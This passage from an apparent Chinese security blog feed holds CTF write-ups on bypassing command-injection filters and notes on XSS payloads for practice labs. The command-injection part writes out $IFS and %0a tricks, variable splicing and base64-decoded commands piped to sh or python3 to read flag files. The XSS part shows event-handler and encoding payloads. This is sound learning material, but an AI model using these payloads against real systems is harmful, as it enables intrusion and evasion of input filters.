class="line">echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br><span class="line">echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|bash</span><br><span class="line">echo$IFS$1aW1wb3J0IG9zCnByaW50KG9zLnN5c3RlbSgnY2F0IGZsYWcucGhwJykp|base64$IFS$1-d|python3</span><br></pre></td></tr></table></figure><ul><li>1<code>&#123;cat,flag.php&#125;</code>大括号扩展：生成一个逗号分割的字符串集合<ul><li>会分别执行 cat flag.php</li></ul></li><li>2<code>cat$&#123;IFS&#125;flag.php</code>内部字段分隔符 IFS：相当于空格、制表、换行</li><li>3<code>cat$IFS$9flag.php</code>$9 是第 9 个参数<ul><li>可以理解为无意义字符，为了绕过检测用的（其实指向第九个参数，这里根本没有指定参数）</li></ul></li><li>4<code>cat&lt;flag.php</code>flag.php 重定向为 cat 的输入</li><li>5<code>cat&lt;&gt;flag.php</code>读取并写入 flag.php<ul><li>其实等于 4，读取再写入</li></ul></li><li>6<code>kg=$&#39;\x20flag.php&#39;&amp;&amp;cat$kg</code>定义<code>kg=$&#39;\x20flag.php&#39;</code>其中 \x20 是 ASCII 中的空格<ul><li>直接定义访问了</li></ul></li><li>7<code>a=c;b=at;c=flag.php;$a$b $c</code>定义表达式访问<ul><li><code>a=ca;b=$&#39;t\x20&#39;;c=flag.php;$a$b$c</code>也可以</li></ul></li><li>8<code>b=ag;a=fl;cat$IFS$1$a$b.php</code>定义表达式+内部字段分割符</li><li>9<code>echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</code><ul><li>用 echo 输出 base64 编码的<code>cat flag</code>管道到 base64 解密，然后管道到 sh 中执行</li></ul></li><li>10<code>echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|bash</code>只是把执行换位了 bash</li><li>11<code>echo$IFS$1aW1wb3J0IG9zCnByaW50KG9zLnN5c3RlbSgnY2F0IGZsYWcucGhwJykp|base64$IFS$1-d|python3</code>用的 python 来执行<ul><li><code>import os</code></li><li><code>print(os.system(&#39;cat flag.php&#39;))</code></li></ul></li></ul><p>注意：<code>$IFS$1</code>就可以理解为一个空格</p><h4 id="IFS-绕过"><a href="#IFS-绕过" class="headerlink" title="$IFS$绕过"></a>$IFS$绕过</h4><p>先寻找 flag 在哪里<code>;ls$IFS$1/</code></p><p><img src="https://raw.githubusercontent.com/godicee/img/main/98eac60d863713bd000349235d0da6fc.png"><img src="https://raw.githubusercontent.com/godicee/img/main/b82ea356ce89c853b6196d2748de7f58.png"></p><p>直接查看 flag<code>;cat$IFS$1flag_151002790815863.php</code>，查看源代码就可以看到</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/dd2c9af5fddd343dd300815527d346c4.png"></p><p>也可以编码后输出<code>;cat$IFS$1flag_151002790815863.php|base64</code></p><p><img src="https://raw.githubusercontent.com/godicee/img/main/2f265eac0effced6293806307ca9edde.png"></p><h4 id="ASCII-编码绕过-x20"><a href="#ASCII-编码绕过-x20" class="headerlink" title="ASCII 编码绕过 \x20"></a>ASCII 编码绕过 \x20</h4><p><code>;a=$&#39;\x20flag_151002790815863.php&#39;&amp;&amp;cat$a</code></p><h4 id="定义表达式绕过"><a href="#定义表达式绕过" class="headerlink" title="定义表达式绕过"></a>定义表达式绕过</h4><p><code>;a=ca;b=t;c=$&#39;\x20flag_151002790815863.php&#39;;$a$b$c</code></p><p><code>;a=ca;b=t;c=$&#39;\x20flag_151002790815863.php&#39;;$a$b$c|base64</code></p><h4 id="加密绕过"><a href="#加密绕过" class="headerlink" title="加密绕过"></a>加密绕过</h4><p><code>cat flag_151002790815863.php</code>编码<code>Y2F0IGZsYWdfMTUxMDAyNzkwODE1ODYzLnBocA==</code></p><p>直接<code>;echo$IFS$1Y2F0IGZsYWdfMTUxMDAyNzkwODE1ODYzLnBocA==|base64$IFS$1-d|sh</code></p><p>查看源代码即可</p><p>也可以编码后输出</p><p><code>;echo$IFS$1Y2F0IGZsYWdfMTUxMDAyNzkwODE1ODYzLnBocA==|base64$IFS$1-d|sh|base64</code></p><p>使用 python（python 没有成功，是不是题目环境没有 python3？）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">print(os.system(&#x27;cat flag_151002790815863.php&#x27;))</span><br><span class="line">编码后</span><br><span class="line">aW1wb3J0IG9zCnByaW50KG9zLnN5c3RlbSgnY2F0IGZsYWdfMTUxMDAyNzkwODE1ODYzLnBocCcpKQ==</span><br></pre></td></tr></table></figure><p>payload 如下</p><p><code>;echo$IFS$1aW1wb3J0IG9zCnByaW50KG9zLnN5c3RlbSgnY2F0IGZsYWdfMTUxMDAyNzkwODE1ODYzLnBocCcpKQ==|base64$IFS$1-d|python3</code></p><h3 id="题目：过滤’-‘"><a href="#题目：过滤’-‘" class="headerlink" title="题目：过滤’&#x2F;‘"></a>题目：过滤’&#x2F;‘</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (!preg_match_all(&quot;/\//&quot;, $ip, $m)) </span><br></pre></td></tr></table></figure><p>查看当前目录下：有一个新多出来的目录</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/240a3077b2ce1fb1b18d564b2ef53ebe.png"></p><p>进入目录并查看<code>;cd flag_is_here;ls</code></p><p><img src="https://raw.githubusercontent.com/godicee/img/main/6e2a843b7029e82e7eb73d409c604158.png"></p><p><code>;cd flag_is_here;cat flag_256382751229052.php|base64</code></p><h3 id="题目：过滤’-和-’"><a href="#题目：过滤’-和-’" class="headerlink" title="题目：过滤’|| 和&amp;’"></a>题目：过滤’|| 和&amp;’</h3><p><img src="https://raw.githubusercontent.com/godicee/img/main/87d3306ba5f48a7c8cd17a0dc83a41dd.png"></p><p>正则<code>&quot;/(\||\&amp;)/&quot;</code>：匹配<code>|</code>或者<code>&amp;</code>（中间那个<code>|</code>是或者符）</p><p>直接分号就行了<code>;cat flag_138181990221028.php</code></p><h3 id="组合过滤（前面所有）"><a href="#组合过滤（前面所有）" class="headerlink" title="组合过滤（前面所有）"></a>组合过滤（前面所有）</h3><p><img src="https://raw.githubusercontent.com/godicee/img/main/c819142bc144a46d2441969821bf0ebd.png"></p><ul><li><p>过滤了的东西：</p><ul><li><code>|``&amp;``;`` </code>(空格)<code>/``cat``flag``ctfhub</code></li></ul></li><li><p>在 Windows 和 linux 中<code>%0a</code>（回车）都可以作为命令分隔符使用</p></li><li><p>**<font style="color:#DF2A3F;">特别注意：</font>**在这里的数据流向</p><ul><li>用户在输入框输入的表单数据——会用 GET 方式传递到浏览器 URL 中</li><li>浏览器会被 URL 中的特殊字符 url 编码一次——传递到后端</li><li>后端获取后会被解码</li></ul></li><li><p>**<font style="color:#DF2A3F;">因此：</font>**在这里输入框如果输入<code>%0a</code>会被浏览器编码一次</p><ul><li><code>%</code>会被编码为<code>%25</code>，加上<code>0a</code>就是<code>%250a</code>，在后端解析后就不是我们预期的</li></ul></li><li><p><strong><font style="color:#DF2A3F;">所以：</font></strong></p><ul><li>这里应该直接在 url 中输入，而不是在输入框输入</li><li>也可以在</li></ul></li></ul><p><img src="https://raw.githubusercontent.com/godicee/img/main/8a7e9e44f304c913e18a9406ba79f771.png"></p><p>查看当前目录<code>%0als</code></p><p><img src="https://raw.githubusercontent.com/godicee/img/main/5a14aa589bed47e5e72d2ec6db44d182.png"></p><ul><li>进入到 flag 的目录<code>%0aa=fl%0ab=ag_is_here%0acd$IFS$1$a$b%0als</code><ul><li>这里是用的<code>%0a</code>分割</li><li>然后表达式定义</li><li><code>$IFS$1</code>作空格</li></ul></li></ul><p><img src="https://raw.githubusercontent.com/godicee/img/main/8198a2f4e656aab295e40c0432ef386c.png"></p><ul><li>查看 flag<ul><li>前面的命令是<code>%0aa=fl%0ab=ag_is_here%0acd$IFS$1$a$b%0a</code></li><li>在后面加上查看 flag 的命令<ul><li>cat 也被过滤了直接用<code>ca\t</code>制表符绕过（也可以定义表达式）</li><li>flag 文件名：<code>c=fl%0ad=ag_1490190811343.php</code></li><li>就应该是<code>c=fl%0ad=ag_1490190811343.php%0aca\t$IFS$1$c$d</code></li></ul></li></ul></li><li>拼接起来就是如下</li></ul><p><code>%0aa=fl%0ab=ag_is_here%0acd$IFS$1$a$b%0ac=fl%0ad=ag_1490190811343.php%0aca\t$IFS$1$c$d</code></p><p>一发入魂，拿下！（查看源代码即可）</p><p>可以直接 base64，不用 cat</p><p><code>%0aa=fl%0ab=ag_is_here%0acd$IFS$1$a$b%0ac=fl%0ad=ag_1490190811343.php%0abase64$IFS$1$c$d</code></p><p><img src="https://raw.githubusercontent.com/godicee/img/main/f7f714502f9a29c7335de7cea5c48f73.png"></p>]]></content>
    
    
    <summary type="html">---title: CTF_Show_RCE技能树categories: 安全基础---RCE总结命令注入命令分割符号：linux: -%0a(回车) %0d(换行)    -;     -&amp;amp;       -|        -&amp;amp;&amp;amp;     -|| Windows: -%0a -&amp;amp; -| -%...</summary>
    
    
    
    <category term="安全基础" scheme="http://godice.top/categories/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
  </entry>
  
  <entry>
    <title>ctf_hub</title>
    <link href="http://godice.top/ctf_hub.html"/>
    <id>http://godice.top/ctf_hub.html</id>
    <published>2024-11-05T09:29:14.000Z</published>
    <updated>2024-11-05T09:29:41.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1eval-执行"><a href="#1eval-执行" class="headerlink" title="1eval 执行"></a>1eval 执行</h3>]]></content>
    
    
    <summary type="html">1eval 执行</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>burp的xss使用</title>
    <link href="http://godice.top/burp%E7%9A%84xss%E4%BD%BF%E7%94%A8.html"/>
    <id>http://godice.top/burp%E7%9A%84xss%E4%BD%BF%E7%94%A8.html</id>
    <published>2024-11-03T08:09:08.000Z</published>
    <updated>2024-11-03T08:22:30.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="burp-官方测试"><a href="#burp-官方测试" class="headerlink" title="burp 官方测试"></a>burp 官方测试</h2><h3 id="1-官方站点"><a href="#1-官方站点" class="headerlink" title="1 官方站点"></a>1 官方站点</h3><p><a href="https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation">burp 官方测试网站（多种漏洞）</a></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/47779600/1730621434038-31a3a744-c04a-4aaa-b311-3cbf75dfd934.png"></p><h3 id="2-反射型测试"><a href="#2-反射型测试" class="headerlink" title="2 反射型测试"></a>2 反射型测试</h3><p>反射型的测试</p><p><a href="https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/xss/bypassing-filters">burp 的 fuzz 测试 xss</a></p><p>（该页面里面有测试页面和 payload）</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/47779600/1730621583029-90c8d62a-b5b6-4cab-899b-a8184f1c3c29.png"></p><p><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked">反射型 xss 测试站点</a></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/47779600/1730621697769-185f3fa7-bfba-435d-a09c-d4b5eaca30b8.png"></p><p><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">payload页面</a></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/47779600/1730621932299-22839f13-bdf9-4dd6-85fd-d117e30f3c0c.png">可以用到 burp 的 intruder 中测试</p>]]></content>
    
    
    <summary type="html">burp 官方测试1 官方站点burp 官方测试网站（多种漏洞）2 反射型测试反射型的测试burp 的 fuzz 测试 xss（该页面里面有测试页面和 payload）反射型 xss 测试站点payload页面可以用到 burp 的 intruder 中测试</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>Js 原型链污染</title>
    <link href="http://godice.top/Js%20%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93.html"/>
    <id>http://godice.top/Js%20%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93.html</id>
    <published>2024-11-03T08:04:21.000Z</published>
    <updated>2024-11-03T08:04:45.000Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/7182?time__1311=n4+xnD0Dy737q4YqAKDsA3rxIxg+YDBeUPzmoD">原型链污染</a></p>]]></content>
    
    
    <summary type="html">原型链污染</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>b 站视频学习</title>
    <link href="http://godice.top/b%20%E7%AB%99%E8%A7%86%E9%A2%91%E5%AD%A6%E4%B9%A0.html"/>
    <id>http://godice.top/b%20%E7%AB%99%E8%A7%86%E9%A2%91%E5%AD%A6%E4%B9%A0.html</id>
    <published>2024-11-03T07:05:34.000Z</published>
    <updated>2024-11-03T15:34:08.000Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://space.bilibili.com/282616786/channel/seriesdetail?sid=2061170">xss 视频</a></p><h2 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h2><p>Dom 和 Bom</p><ul><li>Dom （Document Browser Model）和 Bom（Browser Object Model）<ul><li>Bom 代表的浏览器本身<ul><li>Dom 属于 Bom，是一个组成部件（用于 Html 元素处理的）</li><li>Window 也属于 Bom</li></ul></li></ul></li></ul><p><img src="https://cdn.nlark.com/yuque/0/2024/png/47779600/1730617929513-a5cc8111-a78f-4052-a350-802c0bec366d.png"> </p><p>下面是浏览器必须实现的标准接口组件</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/47779600/1730618157767-01fd70ec-df5f-4012-9a65-195ec4ad0b4d.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/47779600/1730618262802-085621bb-fceb-4404-a343-32380c708b4c.png"></p><p>反射、存储、Dom</p><ul><li>反射：构建请求参数，向服务器请求——注入参数在 http 请求中，由服务器返回 html 到页面<ul><li>经过服务器：短暂的经过服务器，可能会被服务器过滤</li><li>利用：构造钓鱼链接（包含恶意代码），让其用户访问——向后端请求输出到前端<ul><li>可以盗取 Cookie</li></ul></li></ul></li><li>存储：直接存储在服务器数据库中（只要是持久存在的就可以，不一定是数据库）——用户访问页面会执行<ul><li>直接存储在服务器：可能会被过滤</li></ul></li><li>Dom：利用 document 注入到 html 中，不经过服务器，不会被过滤掉</li></ul><h2 id="Dom-的相关基础"><a href="#Dom-的相关基础" class="headerlink" title="Dom 的相关基础"></a>Dom 的相关基础</h2><h3 id="3burp-xss-使用"><a href="#3burp-xss-使用" class="headerlink" title="3burp-xss 使用"></a>3burp-xss 使用</h3><h4 id="3-1-官方站点"><a href="#3-1-官方站点" class="headerlink" title="3.1 官方站点"></a>3.1 官方站点</h4><p><a href="https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation">burp 官方测试网站（多种漏洞）</a></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/47779600/1730621434038-31a3a744-c04a-4aaa-b311-3cbf75dfd934.png"></p><h4 id="3-2-反射型测试"><a href="#3-2-反射型测试" class="headerlink" title="3.2 反射型测试"></a>3.2 反射型测试</h4><p>反射型的测试</p><p><a href="https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/xss/bypassing-filters">burp 的 fuzz 测试 xss</a></p><p>（该页面里面有测试页面和 payload）</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/47779600/1730621583029-90c8d62a-b5b6-4cab-899b-a8184f1c3c29.png"></p><p><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked">反射型 xss 测试站点</a></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/47779600/1730621697769-185f3fa7-bfba-435d-a09c-d4b5eaca30b8.png"></p><p><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">payload页面</a></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/47779600/1730621932299-22839f13-bdf9-4dd6-85fd-d117e30f3c0c.png">可以用到 burp 的 intruder 中测试</p><h3 id="4Dom-Attribute"><a href="#4Dom-Attribute" class="headerlink" title="4Dom-Attribute"></a>4Dom-Attribute</h3><p>写 html 代码就是对 dom 的操作</p><ul><li>dom 可以操作 html 中的每一个标签</li><li>attributes 可以操作对应标签中的属性（包括触发事件，但不止是）</li></ul><p><a href="https://www.w3schools.com/js/js_htmldom.asp">dom文档</a></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/47779600/1730624045243-364a7a08-93da-4cdd-8c38-1a0006628bf0.png"></p><p>选择事件</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/47779600/1730624938029-914934cd-8b73-4d22-8db5-46daf9dd5224.png"></p><p>Dom 的基础操作</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/47779600/1730641254277-18f21ac9-3e6f-4116-a1d7-8b1ce109bf0e.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1：a 的引用是第一个按钮标签的 Dom 对象（对 a 操作等于对标签操作）</span><br><span class="line">var a = document.getElementsByTagName(&quot;BUTTON&quot;)[0];</span><br><span class="line">2：获取a属性名为：onclick的值：即把myFunction()字符串赋值给 x</span><br><span class="line">var x = a.attributes.getNamedItem(&quot;onclick&quot;).value;</span><br><span class="line">3：把 id 为demo1 的标签的文本内容换为 x——即bbb 替换为 x.value</span><br><span class="line">document.getElementById(&quot;demo1&quot;).innerHTML = x;</span><br></pre></td></tr></table></figure><p>因此最开始页面如下：</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/47779600/1730642383288-c8a0eace-7c71-41ae-82d6-71ef53bd16c2.png"></p><p>点击 Try it 会触发 button 的 onclick——触发 myFunction——因此把 bbb 标签的赋值改变</p><p>变成<img src="https://cdn.nlark.com/yuque/0/2024/png/47779600/1730642518248-ad3a8cc4-ad8d-4daa-9c2f-be1834e802d9.png"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span> Click the button to get the value of onclic attribute of the button element.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;myFunction()&quot;</span>&gt;</span>Try it<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;btn()&quot;</span>&gt;</span>btn<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;demo&quot;</span>&gt;</span> aaa <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;demo1&quot;</span>&gt;</span>bbb<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">myFunction</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> a = <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;button&quot;</span>)[<span class="number">0</span>];</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//var x = a.attributes.getNamedItem(&quot;onclick&quot;).value;</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> x = a.<span class="title function_">getAttribute</span>(<span class="string">&quot;onclick&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;demo&quot;</span>).<span class="property">innerHTML</span> = x;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">btn</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> a = <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;button&quot;</span>)[<span class="number">1</span>];</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//var x = a.attributes.getNamedItem(&quot;onclick&quot;).value;</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> x = a.<span class="title function_">getAttribute</span>(<span class="string">&quot;onclick&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;demo1&quot;</span>).<span class="property">innerHTML</span> = x;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="5Dom-Document"><a href="#5Dom-Document" class="headerlink" title="5Dom-Document"></a>5Dom-Document</h3><h2 id="Xss-攻击流程"><a href="#Xss-攻击流程" class="headerlink" title="Xss 攻击流程"></a>Xss 攻击流程</h2>]]></content>
    
    
    <summary type="html">xss 视频基础概念Dom 和 BomDom （Document Browser Model）和 Bom（Browser Object Model）Bom 代表的浏览器本身Dom 属于 Bom，是一个组成部件（用于 Html 元素处理的）Window 也属于 Bom 下面是浏览器必须实现的标准...</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>Xss绕过</title>
    <link href="http://godice.top/Xss%E7%BB%95%E8%BF%87.html"/>
    <id>http://godice.top/Xss%E7%BB%95%E8%BF%87.html</id>
    <published>2024-11-01T08:52:35.000Z</published>
    <updated>2024-12-04T10:23:50.000Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://reurl.cc/main/cn">短链接生成</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">https</span>:<span class="comment">//xss.haozi.me/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/weixin_54072578/article/details/120934111">xss-labs</a></p><h2 id="正则规则"><a href="#正则规则" class="headerlink" title="正则规则"></a>正则规则</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.匹配任意单个字符（除换行符）</span><br><span class="line">?前面的出现0or1次（可以不出现）</span><br><span class="line">*前面的出现0or多次（可以不出现）</span><br><span class="line">+匹配前面的1or多次（至少出现一次）</span><br></pre></td></tr></table></figure><h2 id="实体编码规则"><a href="#实体编码规则" class="headerlink" title="实体编码规则"></a>实体编码规则</h2><ul><li>三种情况：<ul><li>标签内容：会被当做字符串解析，不会被当作函数<ul><li><code>&lt;script&gt;alert&amp;#40;1&amp;#41&lt;/script&gt;</code></li></ul></li><li>js 代码中出现：也会被当作字符串解析</li><li>事件触发器：可以被当作函数执行<ul><li><code>&lt;img src=1 onerror=&quot;alert&amp;#40;1&amp;#41&quot;&gt;</code></li><li><code>&lt;input onmouseover=&quot;alert&amp;#40;1&amp;#41&quot;&gt;</code></li><li>….</li></ul></li></ul></li></ul><p>js 代码中的情况</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> jsCode = <span class="string">&quot;alert&amp;#40;1&amp;#41;&quot;</span>;</span><br><span class="line"><span class="built_in">eval</span>(jsCode); <span class="comment">// 这将导致JavaScript执行alert(1)</span></span><br><span class="line">在这个例子中，如果使用<span class="built_in">eval</span>()函数执行jsCode字符串，那么<span class="title function_">alert</span>(<span class="number">1</span>)会被执行</span><br><span class="line">但是，直接将jsCode作为字符串输出到页面上，它不会被执行</span><br></pre></td></tr></table></figure><h2 id="xss-haoz"><a href="#xss-haoz" class="headerlink" title="xss.haoz"></a>xss.haoz</h2><p><a href="https://www.cnblogs.com/vinslow/p/17037322.html">参考文档</a></p><h3 id="0x00-普通"><a href="#0x00-普通" class="headerlink" title="0x00 普通"></a>0x00 普通</h3><p>简单注入</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/b1948301405938e75d3b2c5642825f8c.png"></p><h3 id="0x01textarea标签"><a href="#0x01textarea标签" class="headerlink" title="0x01textarea标签"></a>0x01textarea标签</h3><p><img src="https://raw.githubusercontent.com/godicee/img/main/0cd83ebd9349fe715bf5fb72be6b44d1.png"></p><p><code>&lt;textarea&gt;</code>标签为 RCDATA 元素，其中不能再嵌入标签——闭合后再输入即可</p><h3 id="0x02input-标签"><a href="#0x02input-标签" class="headerlink" title="0x02input 标签"></a>0x02input 标签</h3><p>1：闭合 input 标签</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;111111111</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/godicee/img/main/e67434724336b20303472743a8bd5452.png"></p><p>2 闭合 value 的值，然后增加标签中的触发事件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> &gt;</span> 函数如下</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;        &quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(1)        &quot;</span>  &gt;</span>  </span><br></pre></td></tr></table></figure><p>点击文本框就会触发</p><h3 id="0x03-括号（img-button）"><a href="#0x03-括号（img-button）" class="headerlink" title="0x03 括号（img&#x2F;button）"></a>0x03 括号（img&#x2F;button）</h3><p>所有括号替换为空</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (<span class="params">input</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> stripBracketsRe = <span class="regexp">/[()]/g</span></span><br><span class="line">  input = input.<span class="title function_">replace</span>(stripBracketsRe, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> input</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>匹配字符</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/ec10a2a172d66c3fdf400ab508ed8633.png"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">方法一:使用反引号代替括号</span><br><span class="line">&lt;script&gt;alert<span class="string">`1`</span>&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">方法二:使用html实体编码对括号进行编码</span><br><span class="line">&lt;img src=<span class="number">1</span> onerror=<span class="string">&quot;alert&amp;#40;1&amp;#41;&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">注:若要使用编码的方法绕过，需要注意html解析规范</span><br><span class="line">例:<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">alert<span class="symbol">&amp;#40;</span>1<span class="symbol">&amp;#41;</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span>将不会成功</span><br><span class="line">因为&lt;script&gt;标签中解析编码后，不会执行编码后的函数只会将编码后的文本打印出来</span><br><span class="line">所以若要使用编码，通常使用在on事件中的语句进行编码</span><br></pre></td></tr></table></figure><p><a href="https://config.net.cn/tools/HtmlEncode.html">html实体编码在线网站</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;button onclick=<span class="string">&quot;alert&amp;#40;1&amp;#41;&quot;</span>&gt;点击触发xss&lt;/button&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span 